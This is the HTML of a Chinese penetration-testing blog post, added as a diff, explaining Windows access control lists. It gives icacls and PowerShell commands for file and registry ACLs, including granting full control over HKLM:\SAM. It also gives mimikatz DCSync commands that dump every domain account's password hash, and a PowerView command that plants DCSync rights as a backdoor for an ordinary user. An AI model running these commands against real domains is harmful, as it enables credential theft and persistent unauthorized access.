@@ -1,0 +1,691 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>Windows——Access Control List | 七友 | 路漫漫其修远兮，吾将上下而求索</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="pentest">
+    <meta name="description" content="ACL(Access Control List)ACL是一个windows中的表示用户（组）权限的列表。访问控制列表（ACL）是访问控制项（ACE）的列表。ACL中的每个ACE标识一个用户，并指定该用户允许、拒绝或审核的访问权限 ACL分为两类：  Discretionary Access Control List (DACL)  自由访问控制列表 System Access Control Li">
+<meta name="keywords" content="pentest">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows——Access Control List">
+<meta property="og:url" content="https://byqiyou.github.io/2020/02/23/Windows——Access-Control-List/index.html">
+<meta property="og:site_name" content="七友">
+<meta property="og:description" content="ACL(Access Control List)ACL是一个windows中的表示用户（组）权限的列表。访问控制列表（ACL）是访问控制项（ACE）的列表。ACL中的每个ACE标识一个用户，并指定该用户允许、拒绝或审核的访问权限 ACL分为两类：  Discretionary Access Control List (DACL)  自由访问控制列表 System Access Control Li">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200203112628-f713c672-4634-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200203112855-4eb90e32-4635-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200203113054-958b205c-4635-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200203113503-29c23b3e-4636-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200203114756-f69d6fa6-4637-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200203114555-ae7dcf40-4637-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200203115039-57e17eb0-4638-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200203131359-fbe08fbe-4643-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200203131518-2b0a84d4-4644-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200203200212-03339246-467d-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200203170203-d8aa6d38-4663-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200203202755-9ae8769e-4680-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200203202736-8f95d066-4680-1.png">
+<meta property="og:updated_time" content="2020-02-03T12:59:52.806Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Windows——Access Control List">
+<meta name="twitter:description" content="ACL(Access Control List)ACL是一个windows中的表示用户（组）权限的列表。访问控制列表（ACL）是访问控制项（ACE）的列表。ACL中的每个ACE标识一个用户，并指定该用户允许、拒绝或审核的访问权限 ACL分为两类：  Discretionary Access Control List (DACL)  自由访问控制列表 System Access Control Li">
+<meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200203112628-f713c672-4634-1.png">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname"></h5>
+          <a href="mailto:1920854803@qq.com" title="1920854803@qq.com" class="mail">1920854803@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/byqiyou" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/friends"  >
+                <i class="icon icon-lg icon-friends"></i>
+                Friends
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-about"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Windows——Access Control List</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Windows——Access Control List</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-02-23T12:40:01.000Z" itemprop="datePublished" class="page-time">
+  2020-02-23
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ACL-Access-Control-List"><span class="post-toc-number">1.</span> <span class="post-toc-text">ACL(Access Control List)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#文件中的ACL"><span class="post-toc-number">2.</span> <span class="post-toc-text">文件中的ACL</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#注册表中ACL"><span class="post-toc-number">3.</span> <span class="post-toc-text">注册表中ACL</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#利用ACL实现DCSync后门"><span class="post-toc-number">4.</span> <span class="post-toc-text">利用ACL实现DCSync后门</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Reference"><span class="post-toc-number">5.</span> <span class="post-toc-text">Reference</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Windows——Access-Control-List"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Windows——Access Control List</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-02-23 20:40:01" datetime="2020-02-23T12:40:01.000Z"  itemprop="datePublished">2020-02-23</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h2 id="ACL-Access-Control-List"><a href="#ACL-Access-Control-List" class="headerlink" title="ACL(Access Control List)"></a>ACL(Access Control List)</h2><p>ACL是一个windows中的表示用户（组）权限的列表。访问控制列表（ACL）是访问控制项（ACE）的列表。ACL中的每个ACE标识一个用户，并指定该用户允许、拒绝或审核的访问权限</p>
+<p>ACL分为两类：</p>
+<ol>
+<li><code>Discretionary Access Control List (DACL)</code>  自由访问控制列表</li>
+<li><code>System Access Control List (SACL)</code> 系统访问控制列表</li>
+</ol>
+<p>当一个进程试图访问一个安全对象时，系统会检查该对向的DACL中的ACE：</p>
+<ol>
+<li>如果该对象没有<code>DACL</code>，允许任何访问。</li>
+<li>如果存在<code>DACL</code>，系统会顺序遍历<code>DACL</code>中的每个<code>ACE</code>，检查<code>ACE</code>中的<code>SID</code>在线程的令牌中是否存在。以访问者中的<code>User SID</code>或<code>Group SID</code>作为关键字查询被访问对象中的<code>DACL</code>。顺序：先查询类型为<code>DENY</code>的<code>ACE</code>，若命中且权限符合则访问拒绝；未命中再在<code>ALLOWED</code>类型的<code>ACE</code>中查询，若命中且类型符合则可以访问；以上两步后还没命中那么访问拒绝。</li>
+</ol>
+<h2 id="文件中的ACL"><a href="#文件中的ACL" class="headerlink" title="文件中的ACL"></a>文件中的ACL</h2><p>我们以<code>C:\Windows\SYSVOL\sysvol\qiyou.com</code>为例子</p>
+<p>默认有5个<code>DACL</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200203112628-f713c672-4634-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>选中一条DACL，其中包含多个ACE，表示具有的权限</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200203112855-4eb90e32-4635-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<ol>
+<li>命令行查看文件的<code>ACL</code></li>
+</ol>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200203113054-958b205c-4635-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<ol start="2">
+<li>备份指定ACL<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls qiyou.com /save acl.bak /t</span><br></pre></td></tr></tbody></table></figure>
+</li>
+</ol>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200203113503-29c23b3e-4636-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<ol start="3">
+<li><p>还原指定ACL</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls qiyou.com /restore acl.bak /t</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>添加用户对指定文件的完全访问权限</p>
+</li>
+</ol>
+<p>我们以删除之前生成的<code>acl.bak</code>，可以看到是域管理员是没有<code>ACL</code>的</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200203114756-f69d6fa6-4637-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>添加了F权限之后就可以删除了<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls qiyou.com /grant administrator:(F) /t</span><br></pre></td></tr></tbody></table></figure><p></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200203114555-ae7dcf40-4637-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<ol start="5">
+<li><p>移除用户对指定文件的完全访问权限</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls qiyou.com /remove qiyou /t</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>Powershell查看ACL</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Acl -Path 'qiyou.com'| ft -Wrap -AutoSize</span><br></pre></td></tr></tbody></table></figure>
+</li>
+</ol>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200203115039-57e17eb0-4638-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<h2 id="注册表中ACL"><a href="#注册表中ACL" class="headerlink" title="注册表中ACL"></a>注册表中ACL</h2><p>查看指定路径的ACL<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Acl -Path 'HKLM:\SAM'| ft -Wrap -AutoSize</span><br></pre></td></tr></tbody></table></figure><p></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200203131359-fbe08fbe-4643-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>查看Access项的具体内容：</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$acl = Get-Acl -Path 'HKLM:\SAM'</span><br><span class="line">$acl.Access</span><br></pre></td></tr></tbody></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200203131518-2b0a84d4-4644-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>添加用户qiyou对注册表指定路径的完全访问权限</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$acl</span> = <span class="built_in">Get-Acl</span> HKLM:\SAM</span><br><span class="line"><span class="variable">$person</span> = [System.Security.Principal.NTAccount]<span class="string">"qiyou"</span></span><br><span class="line"><span class="variable">$access</span> = [System.Security.AccessControl.RegistryRights]<span class="string">"FullControl"</span> <span class="comment"># 即(F)</span></span><br><span class="line"><span class="variable">$inheritance</span> = [System.Security.AccessControl.InheritanceFlags]<span class="string">"ObjectInherit,ContainerInherit"</span> <span class="comment"># 即(OI)、(CI)</span></span><br><span class="line"><span class="variable">$propagation</span> = [System.Security.AccessControl.PropagationFlags]<span class="string">"None"</span></span><br><span class="line"><span class="variable">$type</span> = [System.Security.AccessControl.AccessControlType]<span class="string">"Allow"</span> <span class="comment"># 规则为允许访问</span></span><br><span class="line"><span class="variable">$rule</span> = <span class="built_in">New-Object</span> System.Security.AccessControl.RegistryAccessRule( `</span><br><span class="line"><span class="variable">$person</span>,<span class="variable">$access</span>,<span class="variable">$inheritance</span>,<span class="variable">$propagation</span>,<span class="variable">$type</span>)</span><br><span class="line"><span class="variable">$acl</span>.AddAccessRule(<span class="variable">$rule</span>) <span class="comment"># 删除：$acl.RemoveAccessRule($rule)</span></span><br><span class="line"><span class="built_in">Set-Acl</span> HKLM:\SAM <span class="variable">$acl</span></span><br></pre></td></tr></tbody></table></figure>
+<p><strong>注</strong>：（1）修改注册表项HKLM:\SAM的ACL需要Administrator权限，（2）修改注册表项HKLM:\SAM\SAM的ACL需要System权限</p>
+<p><strong>注</strong>：标志符的含义<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">简单权限序列:</span><br><span class="line">        N - 无访问权限</span><br><span class="line">        F - 完全访问权限</span><br><span class="line">        M - 修改权限</span><br><span class="line">        RX - 读取和执行权限</span><br><span class="line">        R - 只读权限</span><br><span class="line">        W - 只写权限</span><br><span class="line">        D - 删除权限</span><br><span class="line">        </span><br><span class="line">在括号中以逗号分隔的特定权限列表:</span><br><span class="line">        DE - 删除</span><br><span class="line">        RC - 读取控制</span><br><span class="line">        WDAC - 写入 DAC</span><br><span class="line">        WO - 写入所有者</span><br><span class="line">        S - 同步</span><br><span class="line">        AS - 访问系统安全性</span><br><span class="line">        MA - 允许的最大值</span><br><span class="line">        GR - 一般性读取</span><br><span class="line">        GW - 一般性写入</span><br><span class="line">        GE - 一般性执行</span><br><span class="line">        GA - 全为一般性</span><br><span class="line">        RD - 读取数据/列出目录</span><br><span class="line">        WD - 写入数据/添加文件</span><br><span class="line">        AD - 附加数据/添加子目录</span><br><span class="line">        REA - 读取扩展属性</span><br><span class="line">        WEA - 写入扩展属性</span><br><span class="line">        X - 执行/遍历</span><br><span class="line">        DC - 删除子项</span><br><span class="line">        RA - 读取属性</span><br><span class="line">        WA - 写入属性</span><br><span class="line">        </span><br><span class="line">继承权限可以优先于每种格式，但只应用于目录:</span><br><span class="line">        (OI) - 对象继承</span><br><span class="line">        (CI) - 容器继承</span><br><span class="line">        (IO) - 仅继承</span><br><span class="line">        (NP) - 不传播继承</span><br><span class="line">        (I) - 从父容器继承的权限</span><br></pre></td></tr></tbody></table></figure><p></p>
+<h2 id="利用ACL实现DCSync后门"><a href="#利用ACL实现DCSync后门" class="headerlink" title="利用ACL实现DCSync后门"></a>利用ACL实现DCSync后门</h2><p>如果我们得到了一个域管理权限，那么我们可以使用<code>DCSync</code>导出域内所有用户的hash<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe privilege::debug "lsadump::dcsync /domain:qiyou.com /all /csv" exit</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>导出指定用户的hash<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe privilege::debug "lsadump::dcsync /domain:qiyou.com /user:administrator /csv" exit</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>默认情况下，只有<code>Domain Controllers</code>和<code>Enterprise Admins</code>权限能够使用<code>DCSync</code>。<br>域内普通用户如果要利用<code>DCSync</code>的话需要添加如下三条ACE(Access Control Entries)：</p>
+<ul>
+<li>DS-Replication-Get-Changes (GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)</li>
+<li>DS-Replication-Get-Changes-All (GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)</li>
+<li>DS-Replication-Get-Changes (GUID:89e95b76-444d-4c62-991a-0facbeda640c)</li>
+</ul>
+<p>使用<code>Powerview</code>添加ACL</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add-DomainObjectAcl -TargetIdentity "DC=qiyou,DC=com" -PrincipalIdentity qiyou -Rights DCSync -Verbose</span><br></pre></td></tr></tbody></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200203200212-03339246-467d-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>这样就可以在另外一台主机登陆了qiyou这个账号用<code>DCSync</code>了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200203170203-d8aa6d38-4663-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>删除ACL<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Remove-DomainObjectAcl -TargetIdentity "DC=qiyou,DC=com" -PrincipalIdentity qiyou -Rights DCSync</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>但是我发现删除ACL之后还是依旧能获取hash，原因不明，先留一个坑</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200203202755-9ae8769e-4680-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200203202736-8f95d066-4680-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.csdn.net/u011801161/article/details/45567289" target="_blank" rel="noopener">https://blog.csdn.net/u011801161/article/details/45567289</a></p>
+<p><a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-control-lists" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-control-lists</a></p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B8%8B%E7%9A%84Access-Control-List/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B8%8B%E7%9A%84Access-Control-List/</a></p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2020-02-03T12:59:52.806Z" itemprop="dateUpdated">2020-02-03 20:59:52</time>
+</span><br>
+
+
+        
+        know it then hack it
+        
+    </div>
+    
+    <footer>
+        <a href="https://byqiyou.github.io">
+            <img src="/img/avatar.jpg" alt="">
+            
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pentest/">pentest</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://byqiyou.github.io/2020/02/23/Windows——Access-Control-List/&title=《Windows——Access Control List》 — 七友&pic=https://byqiyou.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://byqiyou.github.io/2020/02/23/Windows——Access-Control-List/&title=《Windows——Access Control List》 — 七友&source=路漫漫其修远兮，吾将上下而求索" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://byqiyou.github.io/2020/02/23/Windows——Access-Control-List/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Windows——Access Control List》 — 七友&url=https://byqiyou.github.io/2020/02/23/Windows——Access-Control-List/&via=https://byqiyou.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://byqiyou.github.io/2020/02/23/Windows——Access-Control-List/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/01/28/windows取证——文件执行记录的获取和清除/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">windows取证——文件执行记录的获取和清除</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+<section class="comments" id="comments">
+    <div id="disqus_thread"></div>
+    <script>
+    var disqus_shortname = 'true';
+    lazyScripts.push('//' + disqus_shortname + '.disqus.com/embed.js')
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</section>
+
+
+
+
+<section class="comments" id="comments">
+    <!-- UY BEGIN -->
+    <div id="uyan_frame"></div>
+    <script src="http://v2.uyan.cc/code/uyan.js?uid=true"></script>
+    <!-- UY END -->
+</section>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        Thinks
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/2.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/2.png" data-alipay="/img/alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+            <span>博客内容遵循 <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span> &copy; 2018 - 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://byqiyou.github.io/2020/02/23/Windows——Access-Control-List/&title=《Windows——Access Control List》 — 七友&pic=https://byqiyou.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://byqiyou.github.io/2020/02/23/Windows——Access-Control-List/&title=《Windows——Access Control List》 — 七友&source=路漫漫其修远兮，吾将上下而求索" data-title=" QQ">
